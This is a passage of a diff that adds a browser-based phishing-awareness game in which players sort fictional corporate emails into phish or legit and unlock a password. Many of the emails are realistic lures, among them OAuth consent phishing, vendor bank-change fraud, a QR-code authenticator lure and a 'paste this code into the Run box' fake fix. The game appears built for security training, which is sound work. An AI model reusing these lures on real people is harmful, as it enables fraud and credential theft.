+  </div>
+</header>
+
+<main id="main">
+  <!-- Landing -->
+  <section class="screen" id="screen-landing" aria-labelledby="landing-title" hidden>
+    <div class="wrap">
+      <div class="hero">
+        <h1 id="landing-title" class="screen-heading" tabindex="-1">Phish or Legit?</h1>
+        <p>The Email Detective Game. Ten emails, one locked word. Read the headers, check the records, and decide like an investigator.</p>
+      </div>
+      <div class="landing-grid">
+        <form class="card panel" id="start-form" novalidate>
+          <h2>Start a case</h2>
+          <fieldset>
+            <legend>Choose an email set</legend>
+            <div class="set-options" id="set-options"></div>
+          </fieldset>
+          <div class="field">
+            <label for="team">Team name <span style="font-weight:400;color:var(--muted)">(optional)</span></label>
+            <input class="input" id="team" name="team" type="text" maxlength="40" autocomplete="off" aria-describedby="team-help">
+            <div class="help" id="team-help">Shown on screen and on your results.</div>
+          </div>
+          <div class="start-row">
+            <button class="btn btn-primary" type="submit" id="btn-start">Start the case and the timer</button>
+            <span class="form-error" id="start-error" role="alert"></span>
+          </div>
+        </form>
+        <section class="card panel" aria-labelledby="rules-title">
+          <h2 id="rules-title">How to play</h2>
+          <ol class="rules">
+            <li>You play an employee on a busy Thursday. Read all 10 emails in the mailbox.</li>
+            <li>Investigate like a security analyst: hover over links, open <strong>⋮ → Show original</strong> to read the headers, and check SPF, DKIM, DMARC, domain age and links with the <strong>Lookup</strong> panel.</li>
+            <li>Mark every email <strong>Phish</strong> or <strong>Legit</strong>. You can change your mind until you submit.</li>
+            <li>Every email ends with an <strong>Answer Hint</strong> letter. The letter tray collects letters only from emails you marked Phish, in email order.</li>
+            <li>Unjumble the tray letters into a word and submit it. All 10 emails must be marked first. After 5 wrong tries there is a 30-second pause.</li>
+            <li>Nothing here goes online. Links, buttons and QR codes never open, and every lookup runs inside the game.</li>
+          </ol>
+        </section>
+      </div>
+    </div>
+  </section>
+
+  <!-- Briefing -->
+  <section class="screen" id="screen-briefing" aria-labelledby="briefing-title" hidden>
+    <div class="wrap">
+      <div class="card panel">
+        <h1 id="briefing-title" class="screen-heading" tabindex="-1" style="font-size:1.5em;margin-bottom:16px">Your briefing</h1>
+        <div data-briefing></div>
+        <div class="briefing-actions">
+          <button type="button" class="btn btn-primary" id="btn-open-inbox">Open the mailbox</button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Mailbox -->
+  <div class="game" id="screen-game" hidden>
+    <nav class="nav" aria-label="Folders">
+      <button type="button" class="compose" aria-disabled="true" title="Compose is disabled in this game">
+        <svg class="i" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 20h9"/><path d="M16.5 3.5a2.1 2.1 0 0 1 3 3L7 19l-4 1 1-4z"/></svg>Compose
+      </button>
+      <ul class="folders">
+        <li class="active"><svg class="i" viewBox="0 0 24 24" aria-hidden="true"><path d="M22 12h-6l-2 3h-4l-2-3H2"/><path d="M5.5 5h13L22 12v6a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2v-6z"/></svg>Inbox<span class="n" id="nav-unread"></span></li>
+        <li><svg class="i" viewBox="0 0 24 24" aria-hidden="true"><path d="m12 3 2.8 5.7 6.2.9-4.5 4.4 1 6.2L12 17.3 6.5 20.2l1-6.2L3 9.6l6.2-.9z"/></svg>Starred</li>
+        <li><svg class="i" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>Snoozed</li>
+        <li><svg class="i" viewBox="0 0 24 24" aria-hidden="true"><path d="m22 2-11 11M22 2l-7 20-4-9-9-4z"/></svg>Sent</li>
+        <li><svg class="i" viewBox="0 0 24 24" aria-hidden="true"><path d="M14 3H6a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><path d="M14 3v6h6"/></svg>Drafts</li>
+        <li><svg class="i" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 8v4M12 16h.01"/></svg>Spam</li>
+      </ul>
+    </nav>
+
+    <section class="pane pane-list" aria-labelledby="inbox-title">
+      <div class="list-head">
+        <h2 id="inbox-title">Inbox</h2>
+        <span class="count" id="marked-count">0 of 10 marked</span>
+      </div>
+      <div class="progress" aria-hidden="true"><span id="progress-bar"></span></div>
+      <ul class="inbox-list" id="inbox-list" aria-label="Emails"></ul>
+      <p class="list-empty" id="list-empty" hidden>No emails match your search.</p>
+    </section>
+
+    <section class="pane pane-reader" aria-label="Reading pane" id="viewer">
+      <div class="reader-toolbar">
+        <button type="button" class="icon-btn reader-back" id="btn-back" aria-label="Back to inbox">
+          <svg class="i" viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+        </button>
+        <span class="pos" id="viewer-pos"></span>
+        <button type="button" class="icon-btn" id="btn-prev" aria-label="Newer email">
+          <svg class="i" viewBox="0 0 24 24"><path d="m15 18-6-6 6-6"/></svg>
+        </button>
+        <button type="button" class="icon-btn" id="btn-next" aria-label="Older email">
+          <svg class="i" viewBox="0 0 24 24"><path d="m9 18 6-6-6-6"/></svg>
+        </button>
+      </div>
+      <article class="mail" id="mail" aria-labelledby="mail-subject"></article>
+      <div class="verdict-bar" role="group" aria-labelledby="verdict-label">
+        <span class="label" id="verdict-label">Your verdict</span>
+        <button type="button" class="btn vbtn" data-v="phish" aria-pressed="false">
+          <svg class="i" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 3 2 20h20z"/><path d="M12 10v4M12 17h.01"/></svg>Mark as Phish
+        </button>
+        <button type="button" class="btn vbtn" data-v="legit" aria-pressed="false">
+          <svg class="i" viewBox="0 0 24 24" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Mark as Legit
+        </button>
+        <span class="kbd-help">Shortcuts: <kbd>P</kbd> Phish, <kbd>L</kbd> Legit, <kbd>J</kbd> older, <kbd>K</kbd> newer</span>
+      </div>
+    </section>
+
+    <aside class="pane side" id="side" aria-label="Investigation tools">
+      <div class="side-tabs" role="tablist" aria-label="Side panel">
+        <button type="button" role="tab" id="tab-lookup" aria-controls="panel-lookup" aria-selected="true">
+          <svg class="i" viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.5-3.5"/></svg>Lookup
+        </button>
+        <button type="button" role="tab" id="tab-tray" aria-controls="panel-tray" aria-selected="false" tabindex="-1">
+          <svg class="i" viewBox="0 0 24 24" aria-hidden="true"><rect x="3" y="4" width="7" height="7" rx="1"/><rect x="14" y="4" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>Letter tray
+        </button>
+        <button type="button" class="icon-btn side-close" id="side-close" aria-label="Close side panel">
+          <svg class="i" viewBox="0 0 24 24"><path d="M18 6 6 18M6 6l12 12"/></svg>
+        </button>
+      </div>
+
+      <div class="side-body" role="tabpanel" id="panel-lookup" aria-labelledby="tab-lookup">
+        <form class="lk-form" id="lk-form" novalidate>
+          <div>
+            <label for="lk-type">Tool</label>
+            <select class="input" id="lk-type">
+              <option value="spftest">SPF test (domain + IP)</option>
+              <option value="spf">SPF record</option>
+              <option value="dkim">DKIM (domain + selector)</option>
+              <option value="dmarc">DMARC policy</option>
+              <option value="whois">WHOIS (domain age and owner)</option>
+              <option value="ip">IP lookup (owner and reverse DNS)</option>
+              <option value="url">URL scan</option>
+            </select>
+          </div>
+          <p class="lk-help" id="lk-help"></p>
+          <div>
+            <label for="lk-a" id="lk-a-label">Domain</label>
+            <input class="input" id="lk-a" type="text" autocomplete="off" spellcheck="false" autocapitalize="off">
+          </div>
+          <div id="lk-b-wrap">
+            <label for="lk-b" id="lk-b-label">IP address</label>
+            <input class="input" id="lk-b" type="text" autocomplete="off" spellcheck="false" autocapitalize="off">
+          </div>
+          <button class="btn btn-primary" type="submit" id="lk-go" style="border-radius:10px">Look up</button>
+        </form>
+        <div class="lk-out" id="lk-out" role="status" aria-live="polite">Results appear here.</div>
+      </div>
+
+      <div class="side-body" role="tabpanel" id="panel-tray" aria-labelledby="tab-tray" hidden>
+        <div class="solved-note" id="solved-note" hidden></div>
+        <p class="tray-explain">Hint letters from the emails you marked <strong>Phish</strong>, in email order. Unjumble them into one word.</p>
+        <div class="tiles" id="tiles" aria-label="Letters in the tray" role="list"></div>
+        <form id="pw-form" novalidate>
+          <label for="pw" style="font-weight:700;display:block;margin-bottom:6px">Password</label>
+          <div class="pw-row">
+            <input class="input" id="pw" type="text" autocomplete="off" autocapitalize="characters" spellcheck="false" maxlength="32" aria-describedby="submit-help">
+            <button class="btn btn-primary" type="submit" id="btn-submit">Submit</button>
+          </div>
+          <div class="submit-help" id="submit-help"></div>
+          <div class="cooldown" id="cooldown" hidden aria-hidden="true"></div>
+          <div class="status" id="status" role="status" aria-live="polite"></div>
+        </form>
+      </div>
+    </aside>
+  </div>
+
+  <!-- Result -->
+  <section class="screen" id="screen-result" aria-labelledby="result-title" hidden>
+    <div class="wrap">
+      <div class="card result-hero">
+        <h1 id="result-title" class="screen-heading" tabindex="-1">Case closed</h1>
+        <p style="color:var(--muted);margin:6px 0 0">You unlocked the word</p>
+        <div class="unlocked-word" id="unlocked-word"></div>
+        <div class="stats">
+          <div class="stat"><div class="stat-label">Time taken</div><div class="stat-value" id="stat-time"></div></div>
+          <div class="stat"><div class="stat-label">Password attempts</div><div class="stat-value" id="stat-attempts"></div></div>
+          <div class="stat"><div class="stat-label">Verdicts correct</div><div class="stat-value" id="stat-score"></div></div>
+        </div>
+      </div>
+      <h2 style="margin:28px 0 0;font-size:1.3em">Debrief</h2>
+      <div class="note" id="debrief-note"></div>
+      <ol class="debrief-list" id="debrief-list"></ol>
+      <div class="result-actions">
+        <button type="button" class="btn" id="btn-back-inbox">Back to the mailbox</button>
+        <button type="button" class="btn" id="btn-print">Print debrief</button>
+        <button type="button" class="btn btn-primary" id="btn-new">New game</button>
+      </div>
+    </div>
+  </section>
+
+  <div class="error-box" id="fatal" role="alert" hidden></div>
+</main>
+
+<div class="linkbar" id="linkbar" aria-hidden="true" hidden></div>
+<div class="toast" id="toast" role="status" aria-live="polite" hidden></div>
+
+<dialog id="dlg-briefing" aria-labelledby="dlg-briefing-title">
+  <div class="dlg-head">
+    <h2 id="dlg-briefing-title">Briefing</h2>
+    <button type="button" class="btn btn-sm" data-close>Close</button>
+  </div>
+  <div class="dlg-body" data-briefing></div>
+</dialog>
+
+<dialog id="dlg-att" aria-labelledby="dlg-att-title">
+  <div class="dlg-head">
+    <h2 id="dlg-att-title">Attachment</h2>
+    <button type="button" class="btn btn-sm" data-close>Close</button>
+  </div>
+  <div class="dlg-body" id="dlg-att-body"></div>
+</dialog>
+
+<dialog id="dlg-reset" class="dlg-small" aria-labelledby="dlg-reset-title" aria-describedby="dlg-reset-desc">
+  <div class="dlg-head"><h2 id="dlg-reset-title">Reset the game?</h2></div>
+  <div class="dlg-body"><p id="dlg-reset-desc" style="margin:0">This clears your markings, the timer and your attempts, and returns to the start screen.</p></div>
+  <div class="dlg-actions">
+    <button type="button" class="btn" data-close autofocus>Cancel</button>
+    <button type="button" class="btn btn-primary" id="btn-reset-confirm" style="background:var(--phish);border-color:var(--phish);color:var(--surface)">Reset</button>
+  </div>
+</dialog>
+
+<script>
+(() => {
+'use strict';
+
+/* ------------------------------------------------------------------
+ * Public game content. Answers live only in the encrypted PAYLOADS.
+ * Body markup: **bold**, [Button text], [QR CODE IMAGE], URLs, \n.
+ * links: visible text -> real destination (shown on hover, never opened).
+ * auth: how the message reached the company's mail server (feeds Show original).
+ * All domains are .example and all IPs are documentation ranges (RFC 2606 / RFC 5737).
+ * ------------------------------------------------------------------ */
+const SETS = {
+  A: {
+    id: 'A',
+    label: 'Set A',
+    company: 'Northwind Systems',
+    domain: 'northwind.example',
+    gateway: 'mx1.northwind.example',
+    persona: { name: 'Riya Sharma', role: 'Senior Finance Analyst', company: 'Northwind Systems', city: 'Pune', email: 'riya.sharma@northwind.example' },
+    briefing: '**You are Riya Sharma**, Senior Finance Analyst at Northwind Systems, Pune. It is Thursday, 29 October 2026, and you signed in at your desk at 08:52 this morning. Read all 10 emails and decide **Phish** or **Legit**. Every email ends with an Answer Hint letter. Collect hints **only from the emails you marked Phish**, in email order, then unjumble them. Passing authentication checks does not make an email safe, and a scary email is not automatically fake. Everything you need is in the emails and the Lookup tools.',
+    emails: [
+      {
+        from: 'Microsoft SharePoint <no-reply@sharepoint.microsoft.example>',
+        to: 'Riya Sharma <riya.sharma@northwind.example>',
+        date: '29 Oct 2026, 09:12 AM',
+        subject: 'Anita Desai shared "Q4_Forecast_Pack.xlsx" with you',
+        body: [
+          'Anita Desai (Treasury) shared a file with you and added a note: "Riya, need your eyes on the Q4 numbers before the board pack locks."',
+          'To preview the workbook, open it with **FinSync Viewer**. You will be asked to approve access, then the file opens.',
+          '[Open in FinSync Viewer]'
+        ],
+        links: { 'Open in FinSync Viewer': 'https://login.microsoft.example/oauth2/authorize?client_id=7f3a9c41-0d2b-4e8a-b6f1-93c0a5d42e1c&response_type=code&redirect_uri=https://finsync-viewer.example/callback&scope=Mail.ReadWrite%20Files.ReadWrite.All%20offline_access' },
+        auth: { ip: '203.0.113.71', rp: 'bounces+spo@sharepoint.microsoft.example', dkim: ['microsoft.example', 'selector1'] },
+        hint: 'T'
+      },
+      {
+        from: 'Microsoft account team <account-security-noreply@accountprotection.microsoft.example>',
+        to: 'Riya Sharma <riya.sharma@northwind.example>',
+        date: '29 Oct 2026, 09:03 AM',
+        subject: 'New sign-in to your work account',
+        body: [
+          'We noticed a new sign-in to your work account.',
+          'Time: 29 October 2026, 08:52 AM IST\nDevice: Windows 11, Microsoft Edge\nApproximate location: Pune, India',
+          'If this was you, you do not need to do anything. If it was not, review your recent activity from your usual Microsoft account page, or contact the IT Service Desk.',
+          '[Review recent activity]'
+        ],
+        links: { 'Review recent activity': 'https://mysignins.microsoft.example' },
+        auth: { ip: '203.0.113.84', rp: 'bounce@accountprotection.microsoft.example', dkim: ['microsoft.example', 'selector2'] },
+        hint: 'K'
+      },
+      {
+        from: 'Billing <billing@cloudvaultpro-services.example>',
+        to: 'Riya Sharma <riya.sharma@northwind.example>',
+        date: '29 Oct 2026, 09:27 AM',
+        subject: 'Receipt: CloudVault Pro Annual Plan — ₹38,499 charged',
+        body: [
+          'Thank you for renewing CloudVault Pro Annual Plan.',
+          'Order ID: CVP-2210-8841\nAmount charged: ₹38,499\nCard: ending 4417\nDate: 29 October 2026',
+          'If you did not authorise this renewal, please call our billing desk within 24 hours so we can cancel and refund the charge: **+91 80 4821 5509**',
+          'Billing Team, CloudVault Pro Services'
+        ],
+        auth: { ip: '192.0.2.101', rp: 'billing@cloudvaultpro-services.example', dkim: ['cloudvaultpro-services.example', 'k1'] },
+        hint: 'S'
+      },
+      {
+        from: 'BrightPay Payroll <payroll@brightpay.example>',
+        to: 'Riya Sharma <riya.sharma@northwind.example>',
+        replyTo: 'payroll-support@brightpay.example',
+        date: '29 Oct 2026, 09:48 AM',
+        subject: 'Action needed by 6 Nov: investment declaration proofs',
+        body: [
+          'Hi Riya,',
+          'Please submit your FY27 investment declaration proofs by **6 November** so your tax deduction is calculated correctly from December.',
+          'Your personalised checklist is attached. It is password-protected, like your monthly payslips. Use the same password as always: the first four letters of your first name in lowercase followed by your date of birth as DDMM. We never email the password.',
+          'Upload your proofs through the BrightPay tile on the company intranet.',
+          'BrightPay Payroll Support'
+        ],
+        attachments: [{ name: 'Declaration_Checklist_FY27.pdf', size: '212 KB', kind: 'pdf', encrypted: true }],
+        auth: { ip: '198.51.100.70', rp: 'bounce-7731@brightpay.example', dkim: ['brightpay.example', 'bp1'] },
+        hint: 'M'
+      },
+      {
+        from: 'Priya Nair, Lumen Logistics <priya.nair@lumenlogistics.example>',
+        to: 'Riya Sharma <riya.sharma@northwind.example>',
+        cc: 'Karan Bhatia <karan.bhatia@northwlnd.example>',
+        replyTo: 'priya.nair@lumenlogistics.example',
+        date: '29 Oct 2026, 09:41 AM',
+        subject: 'RE: RE: PO-4471 — dispatch schedule and invoice LL-2290',
+        body: [
+          'Thanks Riya, dispatch is confirmed for 2 November.',
+          'One more thing: our treasury moved us to a new bank this week, so please remit invoice LL-2290 (₹6,72,400) to the account below instead of the old one. Karan is copied and is fine with this. Our auditors are chasing year-end, so it would help if this cleared by Friday.',
+          'New account: Orion Commercial Bank · A/c 5021 8830 1147 · IFSC ORCB0000412',
+          'Regards,\nPriya'
+        ],
+        quoted: [
+          'On Tue, 27 Oct 2026 at 4:18 PM, Riya Sharma <riya.sharma@northwind.example> wrote:',
+          '> Hi Priya, could you confirm the dispatch date for PO-4471? Invoice LL-2290 is scheduled for payment on our usual terms.',
+          '> Regards, Riya',
+          '>',
+          '> On Mon, 26 Oct 2026 at 11:02 AM, Priya Nair <priya.nair@lumenlogistics.example> wrote:',
+          '>> Hi Riya, PO-4471 is packed and I will confirm the dispatch date shortly. Invoice LL-2290 has been issued as usual.',
+          '>> Regards, Priya'
+        ],
+        auth: { ip: '203.0.113.17', rp: 'priya.nair@lumenlogistics.example', dkim: ['lumenlogistics.example', 'selector1'] },
+        hint: 'Y'
+      },
+      {
+        from: 'Orchid Rewards <diwali@orchidrewards.example>',
+        to: 'Riya Sharma <riya.sharma@northwind.example>',
+        date: '29 Oct 2026, 10:05 AM',
+        subject: 'Your Diwali gift voucher is ready — choose by 4 Nov',
+        body: [
+          'Hi Riya,',
+          'As announced by the CHRO at last Friday\'s town hall, Northwind has partnered with Orchid Rewards for this year\'s Diwali gifts. Your ₹5,000 voucher is ready.',
+          'Choose your brand using the link below. You will be taken to the Northwind sign-in page, so there is no new password to create. The link expires on **4 November**.',
+          '[Choose my gift]',
+          'Prefer not to use the link? The same voucher is on the HR page of the Northwind intranet.',
+          'Questions? Contact the HR Helpdesk, not this mailbox.'
+        ],
+        links: { 'Choose my gift': 'https://northwind.orchidrewards.example/redeem?t=ab41' },
+        auth: { ip: '192.0.2.40', rp: 'bounce@orchidrewards.example', dkim: ['orchidrewards.example', 'or2026'] },
+        hint: 'D'
+      },
+      {
+        from: 'IT Service Desk <servicedesk@northwind.example>',
+        to: 'All Employees <all-employees@northwind.example>',
+        date: '29 Oct 2026, 02:10 AM',
+        subject: 'Mandatory: re-register your Authenticator before 8:30 AM',
+        body: [
+          'Dear colleague,',
+          'We are moving to a new Authenticator service. Staff who do not re-register today will be locked out of Microsoft 365 when the old tokens retire at 8:30 AM.',
+          'To re-register, scan the QR code below with your **personal phone** (not your work laptop) and sign in when prompted.',
+          '[QR CODE IMAGE]',
+          'Thank you for helping us complete this migration.',
+          'IT Service Desk'
+        ],
+        auth: { ip: '198.51.100.200', helo: 'mail.northwind.example', rp: 'servicedesk@northwind.example', dkim: null },
+        hint: 'E'
+      },
+      {
+        from: 'Karan Bhatia <karan.bhatia@northwind.example>',
+        to: 'Riya Sharma <riya.sharma@northwind.example>',
+        date: '29 Oct 2026, 10:12 AM',
+        subject: 'quick look pls — revised variance sheet',
+        body: [
+          'Hi Riya,',
+          'Sorry to ping you while I am travelling. Can you look at the revised variance sheet before the board pack closes today? It will ask you to sign in again.',
+          'https://northwind.sharepoint.example/:x:/s/Finance/Q4_Variance_Rev3',
+          'Thanks,\nKaran',
+          'Sent from my iPhone'
+        ],
+        links: { 'https://northwind.sharepoint.example/:x:/s/Finance/Q4_Variance_Rev3': 'https://northwind.sharepoint.example.account-verify.example/s/Finance/Q4_Variance_Rev3' },
+        auth: { ip: '203.0.113.22', rp: 'karan.bhatia@northwind.example', dkim: ['northwind.example', 'nw2026'], xoip: '198.51.100.231' },
+        hint: 'R'
+      },
+      {
+        from: 'Accounts, Meridian Office Supply <accounts@meridianoffice.example>',
+        to: 'Riya Sharma <riya.sharma@northwind.example>',
+        replyTo: 'accounts@meridianoffice.example',
+        date: '29 Oct 2026, 11:20 AM',
+        subject: 'Notice: our bank account changes from 1 December (no action needed today)',
+        body: [
+          'Dear Riya,',
+          'As part of our treasury consolidation, Meridian Office Supply will change its bank account from 1 December 2026.',
+          'Please do not act on this email alone. In line with your vendor bank-change policy, our Finance Controller, Meera Joshi, will phone your registered Finance contact on the number held in your vendor master record. A signed letter is also on your vendor portal, and we will send Form FC-12 there.',
+          'Until then, please keep paying all invoices to the existing account.',
+          'Meridian Office Supply, Accounts'
+        ],
+        auth: { ip: '203.0.113.40', rp: 'accounts@meridianoffice.example', dkim: ['meridianoffice.example', 'selector1'] },
+        hint: 'W'
+      },
+      {
+        from: 'Adv. Rohit Menon, Legal Notices <legalnotice@menon-associates.example>',
+        to: 'Riya Sharma <riya.sharma@northwind.example>',
+        date: '29 Oct 2026, 11:46 AM',
+        subject: 'Statutory notice MA/2026/1187 — response required within 48 hours',
+        body: [
+          'Dear Madam,',
+          'Your employer is named in the attached statutory notice concerning a dishonoured cheque. For confidentiality, the notice is in an encrypted archive. Archive password: **2026**',
+          'Failure to respond within 48 hours may lead to proceedings. Please open the notice and acknowledge receipt by return email.',
+          'Adv. Rohit Menon\nMenon & Associates'
+        ],
+        attachments: [{ name: 'Notice_MA-1187.zip', size: '48 KB', kind: 'zip', encrypted: true }],
+        auth: { ip: '192.0.2.150', rp: 'legalnotice@menon-associates.example', dkim: ['menon-associates.example', 'default'] },
+        hint: 'N'
+      }
+    ]
+  },
+
+  B: {
+    id: 'B',
+    label: 'Set B',
+    company: 'Corvus Digital',
+    domain: 'corvus.example',
+    gateway: 'mx1.corvus.example',
+    persona: { name: 'Meera Iyer', role: 'HR Operations Executive', company: 'Corvus Digital', city: 'Bengaluru', email: 'meera.iyer@corvus.example' },
+    briefing: '**You are Meera Iyer**, HR Operations Executive at Corvus Digital, Bengaluru. It is Thursday, 29 October 2026. Read all 10 emails and decide **Phish** or **Legit**. Every email ends with an Answer Hint letter. Collect hints **only from the emails you marked Phish**, in email order, then unjumble them. Passing authentication checks does not make an email safe, and an urgent or unusual email is not automatically fake. Everything you need is in the emails and the Lookup tools.',
+    emails: [
+      {
+        from: 'IT Service Desk <servicedesk@corvus.example>',
+        to: 'Meera Iyer <meera.iyer@corvus.example>',
+        date: '29 Oct 2026, 09:00 AM',
+        subject: 'Your password expires in 24 hours',
+        body: [
+          'Hi Meera,',
+          'Your directory password expires tomorrow, 30 October, at 9:00 AM IST. If it is not changed before then, you will be locked out of email, Teams and HRMS until the Service Desk resets it.',
+          'Change it now: [Change password]',
+          'You can also press Ctrl+Alt+Del on your laptop and choose Change a password.',
+          'IT Service Desk'
+        ],
+        links: { 'Change password': 'https://login.corvus.example/changepassword' },
+        auth: { ip: '203.0.113.30', rp: 'servicedesk@corvus.example', dkim: ['corvus.example', 'crv1'] },
+        hint: 'B'
+      },
+      {
+        from: 'Microsoft Teams Quality Team <quality@meetingfix-support.example>',
+        to: 'Meera Iyer <meera.iyer@corvus.example>',
+        date: '29 Oct 2026, 09:21 AM',
+        subject: 'Your last two Teams calls had audio failures — 30-second fix',
+        body: [
+          'Hello Meera,',
+          'Our diagnostics show that your last two meetings suffered audio dropouts caused by a local driver conflict.',
+          'Open the page below and select **Verify you are human**. The page will then show a short code. Copy it, press the Windows key + R, paste it into the box that opens and press Enter. The fix applies immediately and takes under 30 seconds.',
+          '[Start the fix]',
+          'Microsoft Teams Quality Team'
+        ],
+        links: { 'Start the fix': 'https://meetingfix-support.example/verify' },
+        auth: { ip: '198.51.100.150', rp: 'quality@meetingfix-support.example', dkim: ['meetingfix-support.example', 'mail'] },
+        hint: 'D'
+      },
+      {
+        from: 'Sneha Kulkarni <sneha.kulkarni.blr@gmail.example>',
+        to: 'Meera Iyer <meera.iyer@corvus.example>',
+        replyTo: 'sneha.kulkarni.blr@gmail.example',
+        date: '29 Oct 2026, 09:44 AM',
+        subject: 'Salary account change before this month\'s payroll',
+        body: [
+          'Hi Meera,',
+          'I have switched banks and my old account will be closed this week. Could you please update my salary account before the 31st payroll run? I am in back-to-back client calls today, so email is easiest.',
+          'New account: Zenith Bank · A/c 7714 2209 5830 · IFSC ZNTH0000209',
+          'Please confirm once it is done so I do not miss my salary.',
+          'Thanks,\nSneha\nMarketing'
+        ],
+        auth: { ip: '192.0.2.201', rp: 'sneha.kulkarni.blr@gmail.example', dkim: ['gmail.example', '20230601'] },
+        hint: 'N'
+      },
+      {
+        from: 'Internal Communications <internalcomms@corvus.example>',
+        to: 'All Employees <all-employees@corvus.example>',
+        date: '29 Oct 2026, 10:05 AM',
+        subject: 'Q3 results all-hands: join live tomorrow at 4:00 PM',
+        body: [
+          'Hi everyone,',
+          'Our CEO will present the Q3 results and take questions at tomorrow\'s all-hands, **Friday 30 October, 4:00 PM IST**. We are streaming on Webcastly, as for previous all-hands.',
+          'Register here (name only, no password): https://crv.example/go/allhands-q3',
+          'A calendar invite will follow from the CEO\'s office.',
+          'Internal Communications'
+        ],
+        links: { 'https://crv.example/go/allhands-q3': 'https://crv.example/go/allhands-q3' },
+        auth: { ip: '203.0.113.31', rp: 'internalcomms@corvus.example', dkim: ['corvus.example', 'crv1'] },
+        hint: 'C'
+      },
+      {
+        from: 'Aditi Verma via SignFlow <noreply@signflow.example>',
+        to: 'Meera Iyer <meera.iyer@corvus.example>',
+        replyTo: 'aditi.verma.comp@proton-mail.example',
+        date: '29 Oct 2026, 10:32 AM',
+        subject: 'Please sign: Salary Revision Letter FY27',
+        body: [
+          'Aditi Verma (HR Compensation) sent you a document to review and sign.',
+          'Document: Salary_Revision_Letter_FY27.pdf\nThis request expires in 24 hours.',
+          '[Review and sign]',
+          'If you do not want to sign, you can ignore this email.'
+        ],
+        links: { 'Review and sign': 'https://app.signflow.example/review/9f2e81c4d7' },
+        auth: { ip: '203.0.113.165', rp: 'bounces@signflow.example', dkim: ['signflow.example', 'sf1'] },
+        hint: 'E'
+      },
+      {
+        from: 'Ananya Rao <ananya.rao.design@gmail.example>',
+        to: 'Meera Iyer <meera.iyer@corvus.example>',
+        date: '29 Oct 2026, 10:50 AM',
+        subject: 'Application: Senior UX Researcher (UXR-118)',
+        body: [
+          'Dear Ms Iyer,',
+          'I am writing to apply for the Senior UX Researcher role (UXR-118) advertised on your careers page. I have seven years of research experience in fintech and healthcare products.',
+          'My CV is attached. The second page links to my full portfolio, including case studies I cannot share publicly.',
+          'I would welcome the chance to speak with the team.',
+          'Kind regards,\nAnanya Rao'
+        ],
+        links: { 'View full portfolio': 'https://ananyarao-portfolio.example/view' },
+        attachments: [{
+          name: 'Ananya_Rao_CV.pdf', size: '184 KB', kind: 'pdf', info: 'PDF · 2 pages',
+          pages: [
+            ['**Ananya Rao**', 'Senior UX Researcher · Bengaluru · ananya.rao.design@gmail.example', 'Seven years of user research across fintech and healthcare products.', 'Lead UX Researcher, a payments start-up (2022 to present)\nUX Researcher, a health-tech company (2019 to 2022)\nResearch Associate, a design agency (2018 to 2019)', 'Skills: interviews, usability testing, survey design, research operations.'],
+            ['**Portfolio**', 'Several case studies are under client confidentiality, so my full portfolio is hosted privately.', '[View full portfolio]']
+          ]
+        }],
+        auth: { ip: '192.0.2.205', rp: 'ananya.rao.design@gmail.example', dkim: ['gmail.example', '20230601'] },
+        hint: 'W'
+      },
+      {
+        from: 'HRMS Notifications <hrms-notifications@corvus.example>',
+        to: 'Meera Iyer <meera.iyer@corvus.example>',
+        date: '29 Oct 2026, 11:08 AM',
+        subject: 'Approval required: bank detail change BC-2231',
+        body: [
+          'Hi Meera,',
+          'Arjun Nair submitted a bank detail change request (BC-2231) at 10:42 AM. His one-time code was verified at submission.',
+          'The request is waiting in your HRMS approval queue. For security, account details are not shown in this email. Please review and approve or reject it in HRMS before the payroll cut-off on 31 October.',
+          '[Open approval queue]',
+          'This is an automated message from HRMS.'
+        ],
+        links: { 'Open approval queue': 'https://hrms.corvus.example/approvals' },
+        auth: { ip: '203.0.113.33', rp: 'hrms-notifications@corvus.example', dkim: ['corvus.example', 'crv1'] },
+        hint: 'T'
+      },
+      {
+        from: 'Kavita Sethi, CHRO Office <chro.office@corvus.example>',
+        to: 'Meera Iyer <meera.iyer@corvus.example>',
+        date: '29 Oct 2026, 11:30 AM',
+        subject: 'Invitation: Compensation Bands Review — Fri 30 Oct, 11:00 AM IST',
+        invite: { title: 'Compensation Bands Review', when: 'Friday 30 October 2026, 11:00 AM–11:45 AM IST', organizer: 'Kavita Sethi <chro.office@corvus.example>', where: 'Join meeting' },
+        body: [
+          'Kavita Sethi has invited you to a meeting.',
+          'Please review the draft band sheet before you join: [View draft band sheet]',
+          'When: Friday 30 October 2026, 11:00 AM–11:45 AM IST\nWhere: [Join meeting]',
+          'The meeting has been added to your calendar.'
+        ],
+        links: { 'View draft band sheet': 'https://corvus-hr-share.example/bands', 'Join meeting': 'https://corvus-hr-share.example/join/7741' },
+        attachments: [{
+          name: 'invite.ics', size: '3 KB', kind: 'ics', code: true,
+          pages: [['BEGIN:VCALENDAR\nMETHOD:REQUEST\nBEGIN:VEVENT\nSUMMARY:Compensation Bands Review\nDTSTART;TZID=Asia/Kolkata:20261030T110000\nDTEND;TZID=Asia/Kolkata:20261030T114500\nORGANIZER;CN=Kavita Sethi:mailto:chro.office@corvus.example\nATTENDEE;CN=Meera Iyer:mailto:meera.iyer@corvus.example\nLOCATION:https://corvus-hr-share.example/join/7741\nEND:VEVENT\nEND:VCALENDAR']]
+        }],
+        auth: { ip: '198.51.100.100', rp: 'bounce-4471@mailer-calendar.example', dkim: ['mailer-calendar.example', 'mc1'] },
+        hint: 'R'
+      },
+      {
+        from: 'Neha Kapoor, Kapoor & Co. <neha.kapoor@kapoorco.example>',
+        to: 'Meera Iyer <meera.iyer@corvus.example>',
+        cc: 'Vikram Rao <vikram.rao@corvus.example>',
+        replyTo: 'neha.kapoor@kapoorco.example',
+        date: '29 Oct 2026, 11:52 AM',
